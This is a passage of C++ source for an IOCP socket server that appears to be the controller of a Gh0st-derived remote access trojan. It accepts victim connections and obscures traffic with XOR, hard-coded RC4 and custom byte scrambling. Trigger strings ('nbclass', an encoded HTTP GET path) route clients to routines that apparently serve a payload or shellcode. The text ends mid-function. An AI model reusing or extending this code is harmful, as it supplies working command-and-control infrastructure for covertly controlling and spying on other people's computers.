// IOCPServer.cpp: implementation of the CIOCPServer class.
//
//////////////////////////////////////////////////////////////////////

#include "pch.h"
#include "IOCPServer.h"
#include "nbclassdlg.h"
#include"../shellcode/logincode.h"
#include "../../common/zlib/zlib.h"

#ifdef _DEBUG

#define new DEBUG_NEW
#endif

// Change at your Own Peril

// 'G' 'h' '0' 's' 't' | PacketLen | UnZipLen
#define HDR_SIZE	13
#define FLAG_SIZE	5
#define HUERISTIC_VALUE 2
CRITICAL_SECTION CIOCPServer::m_cs;

extern CnbclassDlg* g_pCnbclassDlg;   //声明全局变量

// 加密数据
char* EncryptData(char* data, int len)
{
	WORD AddTable[] = {
		'x','c'
	};
	WORD TableSize = sizeof(AddTable) / sizeof(WORD);
	WORD iCount = 0;

	for (int i = 0; i < len; i++)
	{
		if (iCount == TableSize)
			iCount = 0;

		data[i] ^= AddTable[iCount];
		data[i] -= 0x86;

		iCount++;
	}
	return data;
}

//解密数据
char* miyao_suiji(char* data, int len)
{
	WORD AddTable[] = {
		'x','c'
	};
	WORD TableSize = sizeof(AddTable) / sizeof(WORD);
	WORD iCount = 0;
	for (int i = 0; i < len; i++)
	{
		if (TableSize == iCount)
			iCount = 0;

		data[i] += 0x86;
		data[i] ^= AddTable[iCount];

		iCount++;
	}

	return data;
}
//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////


////////////////////////////////////////////////////////////////////////////////
// 
// FUNCTION:	CIOCPServer::CIOCPServer
// 
// DESCRIPTION:	C'tor initializes Winsock2 and miscelleanous events etc.
// 
// INPUTS:		
// 
// NOTES:	
// 
// MODIFICATIONS:
// 
// Name                  Date       Version    Comments
// N T ALMOND            06042001	1.0        Origin
// 
////////////////////////////////////////////////////////////////////////////////
CIOCPServer::CIOCPServer()
{
	TRACE(_T("CIOCPServer=%p\n"),this);	

	WSADATA wsaData;
	WSAStartup(MAKEWORD(2,2), &wsaData);

	InitializeCriticalSection(&m_cs);

	m_hThread		= NULL;
	m_hKillEvent	= CreateEvent(NULL, TRUE, FALSE, NULL);
	m_socListen		= NULL;

	m_bTimeToKill		= false;
	m_bDisconnectAll	= false;

	m_hEvent		= NULL;
	m_hCompletionPort= NULL;

	m_bInit = false;
	m_nCurrentThreads	= 0;
	m_nBusyThreads		= 0;

	m_nSendKbps = 0;
	m_nRecvKbps = 0;

	m_nMaxConnections = 10000;
	m_nKeepLiveTime = 1000 * 60; // 三分钟探测一次
	// Packet Flag;
	BYTE bPacketFlag[] = { 'l','a','s','s',' ' };
	memcpy(m_bPacketFlag, bPacketFlag, sizeof(bPacketFlag));
	char name[] = { 'I',' ','L','o','v','e',' ','Y','o','u',0 };
	rc4_init(m_strkey, (unsigned char*)name, strlen(name));  //初始化 RC4密码
}


////////////////////////////////////////////////////////////////////////////////
// 
// FUNCTION:	CIOCPServer::CIOCPServer
// 
// DESCRIPTION:	Tidy up
// 
// INPUTS:		
// 
// NOTES:	
// 
// MODIFICATIONS:
// 
// Name                  Date       Version    Comments
// N T ALMOND            06042001	1.0        Origin
// 
////////////////////////////////////////////////////////////////////////////////
CIOCPServer::~CIOCPServer()
{
	try
	{
		Shutdown();
		WSACleanup();
	}catch(...){}


}

////////////////////////////////////////////////////////////////////////////////
// 
// FUNCTION:	Init
// 
// DESCRIPTION:	Starts listener into motion
// 
// INPUTS:		
// 
// NOTES:	
// 
// MODIFICATIONS:
// 
// Name                  Date       Version    Comments
// N T ALMOND            06042001	1.0        Origin
// 
////////////////////////////////////////////////////////////////////////////////
bool CIOCPServer::Initialize(NOTIFYPROC pNotifyProc, CnbclassDlg* pFrame, int nMaxConnections, int nPort)
{
	m_pNotifyProc	= pNotifyProc;
	m_pFrame		=  pFrame;
	m_nMaxConnections = nMaxConnections;
	m_socListen = WSASocket(AF_INET, SOCK_STREAM, 0, NULL, 0, WSA_FLAG_OVERLAPPED);


	if (m_socListen == INVALID_SOCKET)
	{
		TRACE(_T("Could not create listen socket %ld\n"),WSAGetLastError());
		return false;
	}

	// Event for handling Network IO
	m_hEvent = WSACreateEvent();

	if (m_hEvent == WSA_INVALID_EVENT)
	{
		TRACE(_T("WSACreateEvent() error %ld\n"),WSAGetLastError());
		closesocket(m_socListen);
		return false;
	}

	// The listener is ONLY interested in FD_ACCEPT
	// That is when a client connects to or IP/Port
	// Request async notification
	int nRet = WSAEventSelect(m_socListen,
						  m_hEvent,
						  FD_ACCEPT);

	if (nRet == SOCKET_ERROR)
	{
		TRACE(_T("WSAAsyncSelect() error %ld\n"),WSAGetLastError());
		closesocket(m_socListen);
		return false;
	}

	SOCKADDR_IN		saServer;		


	// Listen on our designated Port#
	saServer.sin_port = htons(nPort);

	// Fill in the rest of the address structure
	saServer.sin_family = AF_INET;
	saServer.sin_addr.s_addr = INADDR_ANY;

	// bind our name to the socket
	nRet = bind(m_socListen, 
				(LPSOCKADDR)&saServer, 
				sizeof(struct sockaddr));

	if (nRet == SOCKET_ERROR)
	{
		TRACE(_T("bind() error %ld\n"),WSAGetLastError());
		closesocket(m_socListen);
		return false;
	}

	// Set the socket to listen
	nRet = listen(m_socListen, SOMAXCONN);
	if (nRet == SOCKET_ERROR)
	{
		TRACE(_T("listen() error %ld\n"),WSAGetLastError());
		closesocket(m_socListen);
		return false;
	}


	////////////////////////////////////////////////////////////////////////////////////////
	////////////////////////////////////////////////////////////////////////////////////////
	UINT	dwThreadId = 0;

	m_hThread =
			(HANDLE)_beginthreadex(NULL,				// Security
									 0,					// Stack size - use default
									 ListenThreadProc,  // Thread fn entry point
									 (void*) this,	    
									 0,					// Init flag
									 &dwThreadId);	// Thread address

	if (m_hThread != INVALID_HANDLE_VALUE)
	{
		InitializeIOCP();
		m_bInit = true;
		return true;
	}

	return false;
}


////////////////////////////////////////////////////////////////////////////////
// 
// FUNCTION:	CIOCPServer::ListenThreadProc
// 
// DESCRIPTION:	Listens for incoming clients
// 
// INPUTS:		
// 
// NOTES:	
// 
// MODIFICATIONS:
// 
// Name                  Date       Version    Comments
// N T ALMOND            06042001	1.0        Origin
// 
////////////////////////////////////////////////////////////////////////////////
unsigned CIOCPServer::ListenThreadProc(LPVOID lParam)
{
	CIOCPServer* pThis = reinterpret_cast<CIOCPServer*>(lParam);

	WSANETWORKEVENTS events;
	
	while(1)
	{
		//
		// Wait for something to happen
		//
        if (WaitForSingleObject(pThis->m_hKillEvent, 100) == WAIT_OBJECT_0)
            break;

		DWORD dwRet;
		dwRet = WSAWaitForMultipleEvents(1,
									 &pThis->m_hEvent,
									 FALSE,
									 100,
									 FALSE);

		if (dwRet == WSA_WAIT_TIMEOUT)
			continue;

		//
		// Figure out what happened
		//
		int nRet = WSAEnumNetworkEvents(pThis->m_socListen,
								 pThis->m_hEvent,
								 &events);
		
		if (nRet == SOCKET_ERROR)
		{
			TRACE(_T("WSAEnumNetworkEvents error %ld\n"),WSAGetLastError());
			break;
		}

		// Handle Network events //
		// ACCEPT
		if (events.lNetworkEvents & FD_ACCEPT)
		{
			if (events.iErrorCode[FD_ACCEPT_BIT] == 0)
				pThis->OnAccept();
			else
			{
				TRACE(_T("Unknown network event error %ld\n"),WSAGetLastError());
				break;
			}

		}

	} // while....

	return 0; // Normal Thread Exit Code...
}

////////////////////////////////////////////////////////////////////////////////
// 
// FUNCTION:	CIOCPServer::OnAccept
// 
// DESCRIPTION:	Listens for incoming clients
// 
// INPUTS:		
// 
// NOTES:	
// 
// MODIFICATIONS:
// 
// Name                  Date       Version    Comments
// N T ALMOND            06042001	1.0        Origin
// Ulf Hedlund			 09072001			   Changes for OVERLAPPEDPLUS
////////////////////////////////////////////////////////////////////////////////
void CIOCPServer::OnAccept()
{

	SOCKADDR_IN	SockAddr;
	SOCKET		clientSocket;
	
	int			nRet;
	int			nLen;

	if (m_bTimeToKill || m_bDisconnectAll)
		return;

	//
	// accept the new socket descriptor
	//
	nLen = sizeof(SOCKADDR_IN);
	clientSocket = accept(m_socListen,
					    (LPSOCKADDR)&SockAddr,
						&nLen); 

	if (clientSocket == SOCKET_ERROR)
	{
		nRet = WSAGetLastError();
		if (nRet != WSAEWOULDBLOCK)
		{
			//
			// Just log the error and return
			//
			TRACE(_T("accept() error\n"),WSAGetLastError());
			return;
		}
	}

	// Create the Client context to be associted with the completion port
	ClientContext* pContext = AllocateContext();
	// AllocateContext fail
	if (pContext == NULL)
		return;

    pContext->m_Socket = clientSocket;

	pContext->m_hWriteComplete = CreateEvent(0,FALSE,TRUE,0);//修改的
	// Fix up In Buffer
	pContext->m_wsaInBuffer.buf = (char*)pContext->m_byInBuffer;
	pContext->m_wsaInBuffer.len = sizeof(pContext->m_byInBuffer);

   // Associate the new socket with a completion port.
	if (!AssociateSocketWithCompletionPort(clientSocket, m_hCompletionPort, (DWORD) pContext))
    {
        delete pContext;
		pContext = NULL;

        closesocket( clientSocket );
        closesocket( m_socListen );
        return;
    }

	// 关闭nagle算法,以免影响性能，因为控制时控制端要发送很多数据量很小的数据包,要求马上发送
	// 暂不关闭，实验得知能网络整体性能有很大影响
	const BOOL chOpt = 1;

// 	int nErr = setsockopt(pContext->m_Socket, IPPROTO_TCP, TCP_NODELAY, &chOpt, sizeof(char));
// 	if (nErr == -1)
// 	{
// 		TRACE(_T("setsockopt() error\n"),WSAGetLastError());
// 		return;
// 	}

	// Set KeepAlive 开启保活机制
	if (setsockopt(pContext->m_Socket, SOL_SOCKET, SO_KEEPALIVE, (char *)&chOpt, sizeof(chOpt)) != 0)
	{
		TRACE(_T("setsockopt() error\n"), WSAGetLastError());
	}

	// 设置超时详细信息
	tcp_keepalive	klive;
	klive.onoff = 1; // 启用保活
	klive.keepalivetime = m_nKeepLiveTime;
	klive.keepaliveinterval = 1000 * 10; // 重试间隔为10秒 Resend if No-Reply
	WSAIoctl
		(
		pContext->m_Socket, 
		SIO_KEEPALIVE_VALS,
		&klive,
		sizeof(tcp_keepalive),
		NULL,
		0,
		(unsigned long *)&chOpt,
		0,
		NULL
		);

	CLock cs(m_cs, "OnAccept" );
	// Hold a reference to the context
	m_listContexts.AddTail(pContext);


	// Trigger first IO Completion Request
	// Otherwise the Worker thread will remain blocked waiting for GetQueuedCompletionStatus...
	// The first message that gets queued up is ClientIoInitializing - see ThreadPoolFunc and 
	// IO_MESSAGE_HANDLER


	OVERLAPPEDPLUS	*pOverlap = new OVERLAPPEDPLUS(IOInitialize);

	BOOL bSuccess = PostQueuedCompletionStatus(m_hCompletionPort, 0, (DWORD) pContext, &pOverlap->m_ol);
	
	if ( (!bSuccess && GetLastError( ) != ERROR_IO_PENDING))
	{            
        RemoveStaleClient(pContext,TRUE);
	    return;
    }

	m_pNotifyProc((LPVOID) m_pFrame, pContext, NC_CLIENT_CONNECT);

	// Post to WSARecv Next
	PostRecv(pContext);
}


////////////////////////////////////////////////////////////////////////////////
// 
// FUNCTION:	CIOCPServer::InitializeIOCP
// 
// DESCRIPTION:	Create a dummy socket and associate a completion port with it.
//				once completion port is create we can dicard the socket
// 
// INPUTS:		
// 
// NOTES:	
// 
// MODIFICATIONS:
// 
// Name                  Date       Version    Comments
// N T ALMOND            06042001	1.0        Origin
// 
////////////////////////////////////////////////////////////////////////////////
bool CIOCPServer::InitializeIOCP(void)
{

    SOCKET s;
    DWORD i;
    UINT  nThreadID;
    SYSTEM_INFO systemInfo;

    //
    // First open a temporary socket that we will use to create the
    // completion port.  In NT 3.51 it will not be necessary to specify
    // the FileHandle parameter of CreateIoCompletionPort()--it will
    // be legal to specify FileHandle as NULL.  However, for NT 3.5
    // we need an overlapped file handle.
    //

    s = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
    if ( s == INVALID_SOCKET ) 
        return false;

    // Create the completion port that will be used by all the worker
    // threads.
    m_hCompletionPort = CreateIoCompletionPort( (HANDLE)s, NULL, 0, 0 );
    if ( m_hCompletionPort == NULL ) 
	{
        closesocket( s );
        return false;
    }

    // Close the socket, we don't need it any longer.
    closesocket( s );

    // Determine how many processors are on the system.
    GetSystemInfo( &systemInfo );

	m_nThreadPoolMin  = systemInfo.dwNumberOfProcessors * HUERISTIC_VALUE;
	m_nThreadPoolMax  = m_nThreadPoolMin;
	m_nCPULoThreshold = 10; 
	m_nCPUHiThreshold = 75; 

	m_cpu.Init();


    // We use two worker threads for eachprocessor on the system--this is choosen as a good balance
    // that ensures that there are a sufficient number of threads available to get useful work done 
	// but not too many that context switches consume significant overhead.
	UINT nWorkerCnt = systemInfo.dwNumberOfProcessors * HUERISTIC_VALUE;

	// We need to save the Handles for Later Termination...
	HANDLE hWorker;
	m_nWorkerCnt = 0;

    for ( i = 0; i < nWorkerCnt; i++ ) 
	{
		hWorker = (HANDLE)_beginthreadex(NULL,					// Security
										0,						// Stack size - use default
										ThreadPoolFunc,     		// Thread fn entry point
										(void*) this,			// Param for thread
										0,						// Init flag
										&nThreadID);			// Thread address


        if (hWorker == NULL ) 
		{
            CloseHandle( m_hCompletionPort );
            return false;
        }

		m_nWorkerCnt++;

		CloseHandle(hWorker);
    }

	return true;
} 

////////////////////////////////////////////////////////////////////////////////
// 
// FUNCTION:	CIOCPServer::ThreadPoolFunc 
// 
// DESCRIPTION:	This is the main worker routine for the worker threads.  
//				Worker threads wait on a completion port for I/O to complete.  
//				When it completes, the worker thread processes the I/O, then either pends 
//				new I/O or closes the client's connection.  When the service shuts 
//				down, other code closes the completion port which causes 
//				GetQueuedCompletionStatus() to wake up and the worker thread then 
//				exits.
// 
// INPUTS:		
// 
// NOTES:	
// 
// MODIFICATIONS:
// 
// Name                  Date       Version    Comments
// N T ALMOND            06042001	1.0        Origin
// Ulf Hedlund			 09062001              Changes for OVERLAPPEDPLUS
////////////////////////////////////////////////////////////////////////////////
unsigned CIOCPServer::ThreadPoolFunc (LPVOID thisContext)    
{
	// Get back our pointer to the class
	ULONG ulFlags = MSG_PARTIAL;
	CIOCPServer* pThis = reinterpret_cast<CIOCPServer*>(thisContext);
	ASSERT(pThis);

    HANDLE hCompletionPort = pThis->m_hCompletionPort;
    
    DWORD dwIoSize;
    LPOVERLAPPED lpOverlapped;
    ClientContext* lpClientContext;
	OVERLAPPEDPLUS*	pOverlapPlus;
	bool			bError;
	bool			bEnterRead;

	InterlockedIncrement(&pThis->m_nCurrentThreads);
	InterlockedIncrement(&pThis->m_nBusyThreads);

	//
    // Loop round and round servicing I/O completions.
	// 

	for (BOOL bStayInPool = TRUE; bStayInPool && pThis->m_bTimeToKill == false; ) 
	{
		pOverlapPlus	= NULL;
		lpClientContext = NULL;
		bError			= false;
		bEnterRead		= false;
		// Thread is Block waiting for IO completion
		InterlockedDecrement(&pThis->m_nBusyThreads);


		// Get a completed IO request.
		BOOL bIORet = GetQueuedCompletionStatus(
               hCompletionPort,
               &dwIoSize,
               (PULONG_PTR) &lpClientContext,
               &lpOverlapped, INFINITE);

		DWORD dwIOError = GetLastError();
		pOverlapPlus = CONTAINING_RECORD(lpOverlapped, OVERLAPPEDPLUS, m_ol);


		int nBusyThreads = InterlockedIncrement(&pThis->m_nBusyThreads);

        if (!bIORet && dwIOError != WAIT_TIMEOUT )
		{
			if (lpClientContext && pThis->m_bTimeToKill == false)
			{
				pThis->RemoveStaleClient(lpClientContext, FALSE);
				if (pOverlapPlus)
					delete pOverlapPlus;
			}
			continue;

			// anyway, this was an error and we should exit
			bError = true;
		}
		
		if (!bError) 
		{
			
			// Allocate another thread to the thread Pool?
			if (nBusyThreads == pThis->m_nCurrentThreads)
			{
				if (nBusyThreads < pThis->m_nThreadPoolMax)
				{
					if (pThis->m_cpu.GetUsage() > pThis->m_nCPUHiThreshold)
					{
						UINT nThreadID = -1;

//						HANDLE hThread = (HANDLE)_beginthreadex(NULL,				// Security
//											 0,					// Stack size - use default
//											 ThreadPoolFunc,  // Thread fn entry point
///											 (void*) pThis,	    
//											 0,					// Init flag
//											 &nThreadID);	// Thread address

//						CloseHandle(hThread);
					}
				}
			}


			// Thread timed out - IDLE?
			if (!bIORet && dwIOError == WAIT_TIMEOUT)
			{
				if (lpClientContext == NULL)
				{
					if (pThis->m_cpu.GetUsage() < pThis->m_nCPULoThreshold)
					{
						// Thread has no outstanding IO - Server hasn't much to do so die
						if (pThis->m_nCurrentThreads > pThis->m_nThreadPoolMin)
							bStayInPool =  FALSE;
					}

					bError = true;
				}
			}
		}
//////////////////////////////////////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////////////////////////////////////
		if (!bError)
		{
			if(bIORet && NULL != pOverlapPlus && NULL != lpClientContext) 
			{
				try
				{
					//pThis->ProcessIOMessage(pOverlapPlus->m_ioType, lpClientContext, dwIoSize);
					pThis->HandleIO(pOverlapPlus->m_ioType, lpClientContext, dwIoSize);

					lpClientContext = NULL;
				}
				catch (...) {}
			}
		}

		if(pOverlapPlus)
			delete pOverlapPlus; // from previous call
    }

	InterlockedDecrement(&pThis->m_nWorkerCnt);

	InterlockedDecrement(&pThis->m_nCurrentThreads);
	InterlockedDecrement(&pThis->m_nBusyThreads);
   	return 0;
} 

////////////////////////////////////////////////////////////////////////////////
// 
// FUNCTION:	CIOCPServer::Stop
// 
// DESCRIPTION:	Signal the listener to quit his thread
// 
// INPUTS:		
// 
// NOTES:	
// 
// MODIFICATIONS:
// 
// Name                  Date       Version    Comments
// N T ALMOND            06042001	1.0        Origin
// 
////////////////////////////////////////////////////////////////////////////////
void CIOCPServer::Stop()
{
    ::SetEvent(m_hKillEvent);
    WaitForSingleObject(m_hThread, INFINITE);
	CloseHandle(m_hThread);
    CloseHandle(m_hKillEvent);
}

////////////////////////////////////////////////////////////////////////////////
// 
// FUNCTION:	CIOCPServer::GetHostName
// 
// DESCRIPTION:	Get the host name of the connect client
// 
// INPUTS:		
// 
// NOTES:	
// 
// MODIFICATIONS:
// 
// Name                  Date       Version    Comments
// N T ALMOND            06042001	1.0        Origin
// 
////////////////////////////////////////////////////////////////////////////////
CString CIOCPServer::GetHostName(SOCKET socket)
{
	sockaddr_in  sockAddr;
	memset(&sockAddr, 0, sizeof(sockAddr));

	int nSockAddrLen = sizeof(sockAddr);
	
	BOOL bResult = getpeername(socket,(SOCKADDR*)&sockAddr, &nSockAddrLen);
	
	return bResult != INVALID_SOCKET ? inet_ntoa(sockAddr.sin_addr) : "";
}


void CIOCPServer::PostRecv(ClientContext* pContext)
{
	// issue a read request 
	OVERLAPPEDPLUS * pOverlap = new OVERLAPPEDPLUS(IORead);
	ULONG			ulFlags = MSG_PARTIAL;
	DWORD			dwNumberOfBytesRecvd;
	UINT nRetVal = WSARecv(pContext->m_Socket, 
		&pContext->m_wsaInBuffer,
		1,
		&dwNumberOfBytesRecvd, 
		&ulFlags,
		&pOverlap->m_ol, 
		NULL);
	
	if ( nRetVal == SOCKET_ERROR && WSAGetLastError() != WSA_IO_PENDING) 
	{
		RemoveStaleClient(pContext, FALSE);
	}
}

void CIOCPServer::rc4_init(unsigned char* s, unsigned char* key, unsigned long Len)
{
	int i = 0, j = 0, k[256] = { 0 };
	unsigned char tmp = 0;
	for (i = 0; i < 256; i++)
	{
		s[i] = i;
		k[i] = key[i % Len];
	}
	for (i = 0; i < 256; i++)
	{
		j = (j + s[i] + k[i]) % 256;
		tmp = s[i];
		s[i] = s[j];     //交换s[i]和s[j]
		s[j] = tmp;
	}

}

/// <summary>
/// 明文执行是加密，密文执行是解密
/// </summary>
/// <param name="s"></param>
/// <param name="Data"></param>
/// <param name="Len"></param>
void CIOCPServer::rc4_crypt(unsigned char* s, unsigned char* Data, unsigned long Len)
{
	
	int x = 0, y = 0, t = 0;
	unsigned char tmp;
	unsigned long i;
	for (i = 0; i < Len; i++)
	{
		x = (x + 1) % 256;
		y = (y + s[x]) % 256;
		tmp = s[x];
		s[x] = s[y];     //交换s[x]和s[y]
		s[y] = tmp;
		t = (s[x] + s[y]) % 256;
		Data[i] ^= s[t];
	}

}
void CIOCPServer::encryption(LPBYTE szData, unsigned long Size)
{
	
	//该数组用来异或
	WORD AddTable[] = {
		1,9,9,6,1,9,9,5
	};
	WORD TableSize = sizeof(AddTable) / sizeof(WORD);
	WORD iCount = 0;
	unsigned long To = Size / 3;
	for (unsigned long i = 0; i < To; i++)
	{
		if (iCount == TableSize)
			iCount = 0;

		szData[i] ^= AddTable[iCount];
		iCount++;
	}
}



////////////////////////////////////////////////////////////////////////////////
// 
// FUNCTION:	CIOCPServer::Send
// 
// DESCRIPTION:	Posts a Write + Data to IO CompletionPort for transfer
// 
// INPUTS:		
// 
// NOTES:	
// 
// MODIFICATIONS:
// 
// Name                  Date       Version    Comments
// N T ALMOND            06042001	1.0        Origin
// Ulf Hedlund			 09062001			   Changes for OVERLAPPEDPLUS
////////////////////////////////////////////////////////////////////////////////
void CIOCPServer::Send(ClientContext* pContext, LPBYTE lpData, UINT nSize)
{

	if (pContext == NULL)
		return;

	try
	{
		if (nSize > 0)
		{
			// Compress data
			unsigned long	destLen = (double)nSize * 1.001  + 12;
			LPBYTE			pDest = new BYTE[destLen];
			int	nRet = compress(pDest, &destLen, lpData, nSize);
			
			if (nRet != Z_OK)
			{
				delete [] pDest;
				return;
			}
			unsigned char Sbox[256] = { 0 };//S-box;
			memcpy(Sbox, m_strkey, sizeof(m_strkey));
			rc4_crypt(Sbox, (unsigned char*)pDest, destLen);//RC4加密发送
			encryption(pDest, destLen); //加密
			//////////////////////////////////////////////////////////////////////////
			LONG nBufLen = destLen + HDR_SIZE;
			// 4 byte header [Size of Entire Packet]
			pContext->m_WriteBuffer.Write((PBYTE) &nBufLen, sizeof(nBufLen));
			// 5 bytes packet flag
				pContext->m_WriteBuffer.Write(m_bPacketFlag, sizeof(m_bPacketFlag));
			// 4 byte header [Size of UnCompress Entire Packet]
			pContext->m_WriteBuffer.Write((PBYTE) &nSize, sizeof(nSize));
			// Write Data
			pContext->m_WriteBuffer.Write(pDest, destLen);
			delete [] pDest;
			// 如果当前缓冲区无数据堆积，执行PostSend
			if (pContext->m_WriteBuffer.GetBufferLen() == nBufLen)
			{
				EncryptData((char*)pContext->m_WriteBuffer.GetBuffer(), pContext->m_WriteBuffer.GetBufferLen());
				PostSend(pContext);
			}
				
			// 发送完后，再备份数据, 因为有可能是m_ResendWriteBuffer本身在发送,所以不直接写入
			LPBYTE lpResendWriteBuffer = new BYTE[nSize];
			CopyMemory(lpResendWriteBuffer, lpData, nSize);
			pContext->m_ResendWriteBuffer.ClearBuffer();
			pContext->m_ResendWriteBuffer.Write(lpResendWriteBuffer, nSize);	// 备份发送的数据
			delete [] lpResendWriteBuffer;
		}
		else // 要求重发
		{
			pContext->m_WriteBuffer.Write(m_bPacketFlag, sizeof(m_bPacketFlag));
			pContext->m_ResendWriteBuffer.ClearBuffer();
			pContext->m_ResendWriteBuffer.Write(m_bPacketFlag, sizeof(m_bPacketFlag));	// 备份发送的数据	
		}


		pContext->m_nMsgOut++;
	}catch(...){}
}

void CIOCPServer::PostSend (ClientContext* pContext)
{
	OVERLAPPEDPLUS* pOverlap = new OVERLAPPEDPLUS(IOWrite);
	WSABUF sndBuf;
	ULONG ulFlags = MSG_PARTIAL;

	m_pNotifyProc((LPVOID)m_pFrame, pContext, NC_TRANSMIT);

	sndBuf.buf = (char*)pContext->m_WriteBuffer.GetBuffer();
	sndBuf.len = pContext->m_WriteBuffer.GetBufferLen();

	int nRetVal = WSASend(pContext->m_Socket,
		&sndBuf,
		1,
		&sndBuf.len,
		ulFlags,
		&pOverlap->m_ol,
		NULL);

	if (nRetVal == SOCKET_ERROR && WSAGetLastError() != WSA_IO_PENDING)
		RemoveStaleClient(pContext, FALSE);
}

////////////////////////////////////////////////////////////////////////////////
// 
// FUNCTION:	CClientListener::OnClientInitializing
// 
// DESCRIPTION:	Called when client is initailizing
// 
// INPUTS:		
// 
// NOTES:	
// 
// MODIFICATIONS:
// 
// Name                  Date       Version    Comments
// N T ALMOND            06042001	1.0        Origin
// Ulf Hedlund           09062001		       Changes for OVERLAPPEDPLUS
////////////////////////////////////////////////////////////////////////////////
bool CIOCPServer::OnClientInitializing(ClientContext* pContext, DWORD dwIoSize)
{
	// We are not actually doing anything here, but we could for instance make
	// a call to Send() to send a greeting message or something

	return true;		// make sure to issue a read after this
}

////////////////////////////////////////////////////////////////////////////////
// 
// FUNCTION:	CIOCPServer::OnClientReading
// 
// DESCRIPTION:	Called when client is reading 
// 
// INPUTS:		
// 
// NOTES:	
// 
// MODIFICATIONS:
// 
// Name                  Date       Version    Comments
// N T ALMOND            06042001	1.0        Origin
// Ulf Hedlund           09062001		       Changes for OVERLAPPEDPLUS
////////////////////////////////////////////////////////////////////////////////
bool CIOCPServer::OnClientReading(ClientContext* pContext, DWORD dwIoSize)
{
	CLock cs(m_cs, "OnClientReading");
	//判断是否请求上线的




	if (_tcsicmp((char*)pContext->m_byInBuffer, _T("nbclass")) == 0)
	{
		return SendServer(pContext);
	}
	else if (strncmp((char*)pContext->m_byInBuffer, _T("GET /Ymh5eQ== HTTP/1.1"),strlen("GET /Ymh5eQ== HTTP/1.1")) == 0)
	{
		return HttpServer(pContext);
	}
	try
	{
		//////////////////////////////////////////////////////////////////////////
		static DWORD nLastTick = GetTickCount();
		static DWORD nBytes = 0;
		nBytes += dwIoSize;
		
		DWORD dwTime = GetTickCount() - nLastTick;//修改的
		if( dwTime >= 1000 )
		{
			nLastTick = GetTickCount();
			DWORD dwSpeed = nBytes * 1000 / dwTime;
			InterlockedExchange((LPLONG)&(m_nRecvKbps), dwSpeed);
			nBytes = 0;
		}
		//////////////////////////////////////////////////////////////////////////

		if (dwIoSize == 0)
		{
			RemoveStaleClient(pContext, FALSE);
			return false;
		}

		// 解密数据
		miyao_suiji((char*)pContext->m_byInBuffer, dwIoSize);
		
		if (dwIoSize == FLAG_SIZE && memcmp(pContext->m_byInBuffer+4, m_bPacketFlag, FLAG_SIZE) == 0)
		{
			// 重新发送
			Send(pContext, pContext->m_ResendWriteBuffer.GetBuffer(), pContext->m_ResendWriteBuffer.GetBufferLen());
			// 必须再投递一个接收请求
			PostRecv(pContext);
			return true;
		}

		// Add the message to out message
		// Dont forget there could be a partial, 1, 1 or more + partial mesages
		pContext->m_CompressionBuffer.Write(pContext->m_byInBuffer,dwIoSize);
			
		m_pNotifyProc((LPVOID) m_pFrame, pContext, NC_RECEIVE);


		// Check real Data
		while (pContext->m_CompressionBuffer.GetBufferLen() > HDR_SIZE)
		{
			BYTE bPacketFlag[FLAG_SIZE];
			CopyMemory(bPacketFlag, pContext->m_CompressionBuffer.GetBuffer(4), sizeof(bPacketFlag));

			if (memcmp(m_bPacketFlag, bPacketFlag, sizeof(m_bPacketFlag)) != 0)
				throw "bad buffer";

			int nSize = 0;
			CopyMemory(&nSize, pContext->m_CompressionBuffer.GetBuffer(0), sizeof(int));
			
			// Update Process Variable
			pContext->m_nTransferProgress = pContext->m_CompressionBuffer.GetBufferLen() * 100 / nSize;

			if (nSize && (pContext->m_CompressionBuffer.GetBufferLen()) >= nSize)
			{
				int nUnCompressLength = 0;
				// Read off header
				

				pContext->m_CompressionBuffer.Read((PBYTE) &nSize, sizeof(int));
				pContext->m_CompressionBuffer.Read((PBYTE) bPacketFlag, sizeof(bPacketFlag));
				pContext->m_CompressionBuffer.Read((PBYTE) &nUnCompressLength, sizeof(int));
			
				////////////////////////////////////////////////////////
				////////////////////////////////////////////////////////
				// SO you would process your data here
				// 
				// I'm just going to post message so we can see the data
				int	nCompressLength = nSize - HDR_SIZE;
				PBYTE pData = new BYTE[nCompressLength];
				PBYTE pDeCompressionData = new BYTE[nUnCompressLength];
				
				if (pData == NULL || pDeCompressionData == NULL)
					throw "bad Allocate";

				pContext->m_CompressionBuffer.Read(pData, nCompressLength);

				encryption(pData, nCompressLength); //jiemi
				unsigned char Sbox[256] = { 0 };
				memcpy(Sbox, m_strkey, sizeof(m_strkey));
				rc4_crypt(Sbox, (unsigned char*)pData, nCompressLength);//RC4解密读取

				//////////////////////////////////////////////////////////////////////////
				unsigned long	destLen = nUnCompressLength;
				int	nRet = uncompress(pDeCompressionData, &destLen, pData, nCompressLength);
				//////////////////////////////////////////////////////////////////////////
				if (nRet == Z_OK)
				{
					pContext->m_DeCompressionBuffer.ClearBuffer();
					pContext->m_DeCompressionBuffer.Write(pDeCompressionData, destLen);
					m_pNotifyProc((LPVOID) m_pFrame, pContext, NC_RECEIVE_COMPLETE);
				}
				else
				{
					throw "bad buffer";
				}

				delete [] pData;
				delete [] pDeCompressionData;
				pContext->m_nMsgIn++;
			}
			else
				break;
		}
		// Post to WSARecv Next
		PostRecv(pContext);
	}catch(...)
	{
		pContext->m_CompressionBuffer.ClearBuffer();
		// 要求重发，就发送0, 内核自动添加数包标志
		Send(pContext, NULL, 0);
		PostRecv(pContext);
	}

	return true;
}

////////////////////////////////////////////////////////////////////////////////
// 
// FUNCTION:	CIOCPServer::OnClientWriting
// 
// DESCRIPTION:	Called when client is writing
// 
// INPUTS:		
// 
// NOTES:	
// 
// MODIFICATIONS:
// 
// Name                  Date       Version    Comments
// N T ALMOND            06042001	1.0        Origin
// Ulf Hedlund           09062001		       Changes for OVERLAPPEDPLUS
////////////////////////////////////////////////////////////////////////////////
bool CIOCPServer::OnClientWriting(ClientContext* pContext, DWORD dwIoSize)
{
	try
	{
		//////////////////////////////////////////////////////////////////////////
		static DWORD nLastTick = GetTickCount();
		static DWORD nBytes = 0;

		nBytes += dwIoSize;

		if (GetTickCount() - nLastTick >= 1000)
		{
			nLastTick = GetTickCount();
			InterlockedExchange((LPLONG) & (m_nSendKbps), nBytes);
			nBytes = 0;
		}
		//////////////////////////////////////////////////////////////////////////

		TRACE("IOCP Send DONE %d bytes Remain:%d bytes\n",
			dwIoSize,
			pContext->m_WriteBuffer.GetBufferLen());

		// Finished writing - tidy up
		if (dwIoSize > 0) {
			pContext->m_WriteBuffer.Delete(dwIoSize);
